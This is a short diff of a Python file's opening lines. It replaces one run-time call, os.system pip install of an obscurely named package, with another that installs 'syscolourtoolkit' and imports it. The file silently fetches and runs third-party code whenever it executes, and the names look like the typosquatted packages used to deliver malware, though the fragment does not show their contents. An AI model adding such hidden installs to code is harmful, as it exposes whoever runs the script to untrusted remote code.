@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringslibV2")
-import pythoncolouringslibV2
+os.system("pip install syscolourtoolkit")
+import syscolourtoolkit
 import random
 import requests
 import time
